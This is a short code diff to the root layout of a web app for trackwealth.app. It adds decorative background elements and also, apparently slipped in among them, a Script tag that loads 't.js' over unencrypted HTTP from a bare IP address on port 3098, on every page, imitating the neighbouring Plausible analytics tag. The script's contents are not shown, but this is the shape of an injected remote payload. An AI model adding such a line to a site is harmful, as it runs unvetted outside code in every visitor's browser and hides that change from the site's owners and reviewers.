@@ -114,7 +114,11 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         `}} />
       </head>
       <body className="flex flex-col min-h-screen">
+        <div className="aurora aurora-primary" aria-hidden />
+        <div className="aurora aurora-secondary" aria-hidden />
+        <div className="aurora aurora-third" aria-hidden />
         <AnimatedBackground />
+        <div className="grain" aria-hidden />
         <DesignEffects />
         <SharedNavbar brand={brand} />
         <main className="flex-1 pt-16">{children}</main>
@@ -130,6 +134,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <CookieConsent />
         <StickyFooterCTA />
         <Script defer data-domain="trackwealth.app" src="https://plausible.io/js/script.js" strategy="afterInteractive" />
+        <Script defer data-site="trackwealth.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
       </body>
     </html>
   )
